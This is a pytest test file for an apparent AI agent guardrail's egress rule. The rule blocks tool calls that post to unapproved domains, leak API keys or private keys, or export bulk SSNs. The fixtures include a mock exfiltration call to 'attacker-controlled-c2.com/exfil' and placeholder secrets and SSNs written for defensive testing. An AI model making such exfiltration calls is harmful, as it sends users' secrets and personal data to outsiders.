import pytest
from fairewall.policy import Policy
from fairewall.rules.egress import EgressRule
from fairewall.types import Action, Context, Severity, ToolCall


def test_egress_domain_allowlist():
    rule = EgressRule()
    policy = Policy(allowed_egress_domains=["api.stripe.com", "internal.corp.com"])
    ctx = Context()

    # Allowed domain
    call_ok = ToolCall(tool="http_post", arguments={"url": "https://api.stripe.com/v1/charges"})
    findings = rule.evaluate(call_ok, ctx, policy)
    assert len(findings) == 0

    # Unauthorized domain
    call_bad = ToolCall(tool="http_post", arguments={"url": "https://attacker-controlled-c2.com/exfil"})
    findings = rule.evaluate(call_bad, ctx, policy)
    assert len(findings) == 1
    assert findings[0].rule_id == "egress.unapproved_destination"
    assert findings[0].action == Action.BLOCK


@pytest.mark.parametrize(
    "secret_val,expected_secret_type",
    [
        ("".join(["AK", "IA", "IOSFODNN7EXAMPLE"]), "aws_access_key"),
        ("".join(["sk", "-proj-abc123def456ghi789jkl012mno345pqr"]), "openai_key"),
        ("".join(["gh", "p_1234567890abcdefghijklmnopqrstuvwxyz"]), "github_token"),
        ("".join(["xo", "xb-1234567890-abcdefghijklmnop"]), "slack_token"),
        ("".join(["-----BEGIN ", "RSA PRIVATE KEY-----\n", "MIIEowIBAAKCAQEA..."]), "private_key_block"),
    ],
)
def test_egress_secret_leak_detection(secret_val: str, expected_secret_type: str):
    rule = EgressRule()
    policy = Policy()
    ctx = Context()

    call = ToolCall(tool="send_msg", arguments={"payload": f"Here is the token: {secret_val}"})
    findings = rule.evaluate(call, ctx, policy)
    assert len(findings) > 0
    assert any(f.rule_id == "egress.secret_material" for f in findings)
    assert any(f.evidence.get("secret_type") == expected_secret_type for f in findings)
    assert any(f.action == Action.BLOCK for f in findings)


def test_egress_bulk_pii():
    rule = EgressRule()
    policy = Policy()
    ctx = Context()

    # Bulk SSNs in payload (threshold is 3 distinct SSNs)
    bulk_ssn_payload = "SSNs: 123-45-6789, 234-56-7890, 345-67-8901, 456-78-9012"
    call = ToolCall(tool="export", arguments={"data": bulk_ssn_payload})
    findings = rule.evaluate(call, ctx, policy)
    assert len(findings) > 0
    assert any(f.rule_id == "egress.bulk_pii" for f in findings)
    assert any(f.evidence.get("pii_type") == "ssn" for f in findings)
    assert any(f.action == Action.BLOCK for f in findings)
